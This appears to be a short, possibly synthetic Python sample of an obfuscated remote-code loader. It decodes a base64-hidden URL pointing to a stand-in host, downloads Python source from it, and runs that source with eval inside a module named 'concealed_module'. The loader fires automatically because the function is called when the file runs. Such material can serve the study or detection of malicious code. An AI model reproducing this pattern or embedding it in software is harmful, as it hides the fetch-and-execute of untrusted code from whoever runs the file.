import urllib.request
import types
import base64

def request_data(url):
    with urllib.request.urlopen(url) as response:
        source = response.read().decode('utf-8')
    return source

def confusing_function():
    encoded_url = "aHR0cDovL21vY2stcHl0aG9uL2V4ZWN1dGUucHk="
    decoded_url = base64.b64decode(encoded_url).decode('utf-8')
    source = request_data(decoded_url)
    module = types.ModuleType("concealed_module")
    eval(source, module.__dict__)

confusing_function()
